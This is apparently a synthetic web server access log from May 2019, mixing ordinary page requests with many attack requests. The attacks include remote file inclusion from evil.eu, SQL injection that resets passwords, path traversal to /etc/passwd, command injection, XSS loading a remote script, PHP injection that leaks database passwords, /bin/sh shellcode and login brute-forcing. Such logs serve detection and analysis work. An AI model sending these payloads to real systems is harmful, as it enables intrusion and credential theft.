115.221.121.44 - - [18/May/2019:03:24:37 +0200] "GET /?file=http://evil.eu/sh HTTP/1.1" 200 11487 "/api/v1/login/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
54.36.149.94 - - [18/May/2019:03:24:38 +0200] "GET /.env/README.txt HTTP/1.0" 504 3601 "/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
220.243.135.5 - - [18/May/2019:03:24:39 +0200] "GET /?file=http://evil.eu/sh HTTP/1.0" 200 51089 "/api/v1/login/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:24:40 +0200] "GET /blog/how-to-shop/ HTTP/1.0" 200 40002 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:24:40 +0200] "GET /blog/how-to-shop/ HTTP/1.0" 200 62034 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:24:40 +0200] "GET /blog/how-to-shop/ HTTP/1.0" 200 7958 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:24:40 +0200] "GET /blog/how-to-shop/ HTTP/1.0" 200 60116 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:24:40 +0200] "GET /blog/how-to-shop/ HTTP/1.0" 200 1482 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:24:45 +0200] "GET /?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.1" 403 80821 "/core/themes/theme.inc/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:24:46 +0200] "GET /orders.php/?page=/../../../../../../etc/passwd HTTP/1.0" 200 75323 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:24:46 +0200] "GET /orders.php/?page=/../../../../../../etc/passwd HTTP/1.0" 200 67951 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:24:46 +0200] "GET /orders.php/?page=/../../../../../../etc/passwd HTTP/1.0" 200 20566 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:24:46 +0200] "GET /orders.php/?page=/../../../../../../etc/passwd HTTP/1.0" 200 37841 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:24:46 +0200] "GET /orders.php/?page=/../../../../../../etc/passwd HTTP/1.0" 200 77423 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:24:51 +0200] "POST /core/files/js/editor.js/?file=http://evil.eu/sh HTTP/1.0" 200 58995 "/" "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4"
209.133.212.79 - - [18/May/2019:03:24:52 +0200] "GET /blog/how-to-shop/?post=%3script%3ealert(1); HTTP/1.0" 200 1876 "/connection.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:24:53 +0200] "GET /core/files/js/upload.js/ HTTP/1.0" 200 50084 "/api/v1/register/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:24:54 +0200] "GET /index.php/?username=admin&password=1234 HTTP/1.0" 200 12680 "/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:24:55 +0200] "POST /login.php/.well-known/assetlinks.json HTTP/1.0" 200 26980 "/core/files/js/upload.js/" "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4"
39.36.99.88 - - [18/May/2019:03:24:56 +0200] "GET /register.php/ HTTP/1.1" 200 21050 "/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
115.221.121.44 - - [18/May/2019:03:24:57 +0200] "GET /?username=admin&password=password HTTP/1.0" 200 13490 "/orders.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
220.243.135.5 - - [18/May/2019:03:24:58 +0200] "GET /login.php/?file=http://evil.eu/sh HTTP/1.0" 200 80863 "/blog/our-proposals/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:24:59 +0200] "GET /connection.php/?ip=|+ls+-l HTTP/1.0" 200 32455 "/orders.php/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:25:00 +0200] "GET /index.php/ HTTP/1.0" 200 18930 "/login.php/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
1.2.169.95 - - [18/May/2019:03:25:01 +0200] "GET /authorize.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 404 2933 "/login.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:25:02 +0200] "POST /?username=admin&password=1235 HTTP/1.0" 200 41988 "/" "Mozilla/5.0 (Windows NT 6.2; rv:43.0) Gecko/20100101 Firefox/43.0"
115.221.121.44 - - [18/May/2019:03:25:02 +0200] "POST /?username=admin&password=1235 HTTP/1.0" 200 76360 "/" "Mozilla/5.0 (Windows NT 6.2; rv:43.0) Gecko/20100101 Firefox/43.0"
115.221.121.44 - - [18/May/2019:03:25:02 +0200] "POST /?username=admin&password=1235 HTTP/1.0" 200 14954 "/" "Mozilla/5.0 (Windows NT 6.2; rv:43.0) Gecko/20100101 Firefox/43.0"
115.221.121.44 - - [18/May/2019:03:25:02 +0200] "POST /?username=admin&password=1235 HTTP/1.0" 200 54483 "/" "Mozilla/5.0 (Windows NT 6.2; rv:43.0) Gecko/20100101 Firefox/43.0"
115.221.121.44 - - [18/May/2019:03:25:02 +0200] "POST /?username=admin&password=1235 HTTP/1.0" 200 12886 "/" "Mozilla/5.0 (Windows NT 6.2; rv:43.0) Gecko/20100101 Firefox/43.0"
62.109.16.162 - - [18/May/2019:03:25:07 +0200] "GET /core/files/js/editor.js/?post==<?php print $settings[database][password]; ?> HTTP/1.0" 504 69111 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
39.36.99.88 - - [18/May/2019:03:25:08 +0200] "GET /\xf9\xa9\xa5\xcc\xa87\x17,b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8 HTTP/1.0" 504 11771 "/api/v1/orders/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:25:09 +0200] "GET /core/files/js/upload.js/ HTTP/1.0" 404 47989 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
1.2.169.95 - - [18/May/2019:03:25:10 +0200] "GET /core/files/js/editor.js/ HTTP/1.0" 200 50485 "/api/v1/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:25:11 +0200] "GET /core/files/js/upload.js/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 504 57958 "/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F70 Safari/600.1.4"
115.221.121.44 - - [18/May/2019:03:25:12 +0200] "GET /login.php/?customerId=1OR%201=1 HTTP/1.0" 200 50706 "/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
115.221.121.44 - - [18/May/2019:03:25:12 +0200] "GET /login.php/?customerId=1OR%201=1 HTTP/1.0" 200 77447 "/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
115.221.121.44 - - [18/May/2019:03:25:12 +0200] "GET /login.php/?customerId=1OR%201=1 HTTP/1.0" 200 70697 "/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
115.221.121.44 - - [18/May/2019:03:25:12 +0200] "GET /login.php/?customerId=1OR%201=1 HTTP/1.0" 200 35355 "/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
115.221.121.44 - - [18/May/2019:03:25:12 +0200] "GET /login.php/?customerId=1OR%201=1 HTTP/1.0" 200 45615 "/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
121.225.26.201 - - [18/May/2019:03:25:17 +0200] "GET /?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 404 59475 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:25:18 +0200] "GET /api/v1/login/?post=%3script%3ealert(1); HTTP/1.1" 400 75955 "/api/v1/login/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
54.36.149.52 - - [18/May/2019:03:25:19 +0200] "GET /orders.php/?user=admin&amount=100000 HTTP/1.1" 200 83378 "/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
62.109.16.162 - - [18/May/2019:03:25:20 +0200] "GET /register.php/ HTTP/1.0" 504 5488 "/index.php/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F70 Safari/600.1.4"
87.251.81.179 - - [18/May/2019:03:25:21 +0200] "GET / HTTP/1.0" 200 20036 "/register.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:25:22 +0200] "GET /login.php/?file=http://evil.eu/sh HTTP/1.0" 404 2959 "/api/v1/register/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
54.36.149.94 - - [18/May/2019:03:25:23 +0200] "GET /index.php/?username=admin&password=1236 HTTP/1.0" 404 73450 "/connection.php/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
87.251.81.179 - - [18/May/2019:03:25:24 +0200] "GET /%u0061?[buffer]=89898 HTTP/1.0" 400 43575 "/connection.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
62.109.16.162 - - [18/May/2019:03:25:25 +0200] "GET /page/about-us/?id=0%20or%201=1 HTTP/1.0" 200 64455 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:25:26 +0200] "GET /index.php/?username=admin&password=1238 HTTP/1.0" 404 63615 "/cgi-bin/count.cgi/" "Mozilla/5.0 (Android; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0"
62.109.16.162 - - [18/May/2019:03:25:27 +0200] "GET /register.php/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 200 63569 "/register.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:25:28 +0200] "GET / HTTP/1.0" 404 85172 "/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:25:29 +0200] "GET /?id=0%20or%201=1 HTTP/1.1" 200 15769 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
115.221.121.44 - - [18/May/2019:03:25:30 +0200] "GET /api/v1/orders/ HTTP/1.0" 403 14957 "/index.php/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
62.109.16.162 - - [18/May/2019:03:25:31 +0200] "GET /.well-known/assetlinks.json HTTP/1.0" 200 6954 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:25:32 +0200] "GET /orders.php/?username=admin&password=1238 HTTP/1.0" 200 52751 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:25:33 +0200] "GET / HTTP/1.0" 200 18117 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
31.184.238.22 - - [18/May/2019:03:25:34 +0200] "GET /api/v1/login/?username=admin&password=1234 HTTP/1.0" 200 59472 "/" "Mozilla/5.0 (Windows NT 6.2; rv:43.0) Gecko/20100101 Firefox/43.0"
62.109.16.162 - - [18/May/2019:03:25:35 +0200] "GET /orders.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.1" 404 30610 "/login.php/" "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
45.61.164.120 - - [18/May/2019:03:25:36 +0200] "GET /register.php/?username=admin&password=1239 HTTP/1.0" 400 83134 "/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:25:37 +0200] "GET /index.php/ HTTP/1.0" 200 27387 "/api/v1/login/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
182.34.27.162 - - [18/May/2019:03:25:38 +0200] "GET /connection.php/.env/README.txt HTTP/1.0" 404 64679 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
5.13.35.65 - - [18/May/2019:03:25:39 +0200] "GET /core/files/js/upload.js/?username=admin&password=1238 HTTP/1.0" 404 82099 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
62.109.16.162 - - [18/May/2019:03:25:40 +0200] "GET /api/v1/orders/?session=duf8423ufdjr49cce3ije33ssaq2223 HTTP/1.0" 400 68120 "/index.php/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
121.225.26.201 - - [18/May/2019:03:25:41 +0200] "GET /blog/how-to-shop/?username=admin&password=admin2 HTTP/1.0" 504 56998 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:25:42 +0200] "GET /core/files/js/upload.js/?post==<?php print $settings[database][password]; ?> HTTP/1.0" 404 25846 "/api/v1/login/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [18/May/2019:03:25:43 +0200] "GET /update.php/ HTTP/1.0" 404 89110 "/api/v1/orders/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
209.133.212.79 - - [18/May/2019:03:25:44 +0200] "GET /?file=http://evil.eu/root.asp HTTP/1.0" 200 64651 "/index.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:25:45 +0200] "GET /api/v1/register/ HTTP/1.0" 200 44687 "/index.php/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F70 Safari/600.1.4"
182.34.27.162 - - [18/May/2019:03:25:46 +0200] "GET /connection.php/?username=admin&password=1237 HTTP/1.0" 200 43159 "/login.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [18/May/2019:03:25:47 +0200] "GET /api/v1/customers/?post=%3script%3ealert(1); HTTP/1.0" 200 65503 "/" "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
220.243.135.5 - - [18/May/2019:03:25:48 +0200] "GET /register.php/ HTTP/1.0" 200 77132 "/api/v1/login/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:25:49 +0200] "GET /api/v1/login/ HTTP/1.0" 200 3375 "/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
1.2.169.95 - - [18/May/2019:03:25:50 +0200] "GET /core/files/js/editor.js/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 200 1575 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
62.109.16.162 - - [18/May/2019:03:25:51 +0200] "GET / HTTP/1.0" 403 22338 "/api/v1/login/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
54.36.149.52 - - [18/May/2019:03:25:52 +0200] "GET /index.php/?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.0" 200 77553 "/orders.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
62.109.16.162 - - [18/May/2019:03:25:53 +0200] "GET /login.php/?username=admin&password=1236 HTTP/1.0" 200 4852 "/api/v1/register/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:25:54 +0200] "GET /login.php/?username=admin&password=1239 HTTP/1.0" 504 26828 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:25:55 +0200] "POST /core/files/js/editor.js/?username=admin&password=1238 HTTP/1.0" 404 9664 "/api/v1/login/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
220.243.135.5 - - [18/May/2019:03:25:56 +0200] "GET /api/v1/register/ HTTP/1.1" 200 40308 "/core/files/js/upload.js/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
87.251.81.179 - - [18/May/2019:03:25:57 +0200] "GET /index.php/?ip=|+ls+-l HTTP/1.0" 503 35252 "/api/v1/customers/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
39.36.99.88 - - [18/May/2019:03:25:58 +0200] "GET /index.php/?username=admin&password=admin2 HTTP/1.1" 200 23790 "/orders.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:25:59 +0200] "GET /?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 200 30288 "/api/v1/register/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:26:00 +0200] "GET /xmlrpc.php/?username=admin&password=admin2 HTTP/1.0" 200 41740 "/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
54.36.149.52 - - [18/May/2019:03:26:01 +0200] "GET /index.php/?ip=|+ls+-l HTTP/1.1" 200 65472 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:26:02 +0200] "GET /api/v1/register/?username=admin&password=password HTTP/1.0" 200 23998 "/login.php/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
39.36.99.88 - - [18/May/2019:03:26:03 +0200] "GET /?username=admin&password=password HTTP/1.0" 404 59170 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:26:04 +0200] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 17816 "/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
182.34.27.162 - - [18/May/2019:03:26:05 +0200] "GET /api/v1/register/?post=%3script%3ealert(1); HTTP/1.0" 200 5192 "/core/files/js/editor.js/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
54.36.149.94 - - [18/May/2019:03:26:06 +0200] "GET /api/v1/login/?id=0%20or%201=1 HTTP/1.0" 200 67444 "/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:26:07 +0200] "GET /api/v1/login/?post=%3script%3ealert(1); HTTP/1.0" 200 3357 "/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
39.36.99.88 - - [18/May/2019:03:26:08 +0200] "GET /api/v1/login/?file=http://evil.eu/sh HTTP/1.0" 200 6378 "/login.php/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:26:09 +0200] "GET /page/about-us/ HTTP/1.0" 200 44041 "/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
91.138.198.224 - - [18/May/2019:03:26:10 +0200] "GET /login.php/.env/README.txt HTTP/1.0" 404 18817 "/api/v1/customers/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:26:11 +0200] "GET /api/v1/customers/?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 400 58360 "/blog/how-to-shop/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) rekonq/2.4.2 Safari/537.21"
54.36.149.94 - - [18/May/2019:03:26:12 +0200] "GET /api/v1/login/?session=vwdefcwec334scfdjr49ccededfewsd HTTP/1.0" 200 27591 "/login.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
209.133.212.79 - - [18/May/2019:03:26:13 +0200] "GET /register.php/.env/README.txt HTTP/1.0" 403 88115 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
62.109.16.162 - - [18/May/2019:03:26:14 +0200] "GET /core/files/js/upload.js/?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.0" 200 6441 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:26:15 +0200] "GET /core/themes/theme.inc/ HTTP/1.1" 200 51855 "/index.php/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
62.109.16.162 - - [18/May/2019:03:26:15 +0200] "GET /core/themes/theme.inc/ HTTP/1.1" 200 35302 "/index.php/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
62.109.16.162 - - [18/May/2019:03:26:15 +0200] "GET /core/themes/theme.inc/ HTTP/1.1" 200 55762 "/index.php/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
62.109.16.162 - - [18/May/2019:03:26:15 +0200] "GET /core/themes/theme.inc/ HTTP/1.1" 200 23118 "/index.php/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
62.109.16.162 - - [18/May/2019:03:26:15 +0200] "GET /core/themes/theme.inc/ HTTP/1.1" 200 66476 "/index.php/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
62.109.16.162 - - [18/May/2019:03:26:15 +0200] "GET /core/themes/theme.inc/ HTTP/1.1" 200 61493 "/index.php/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
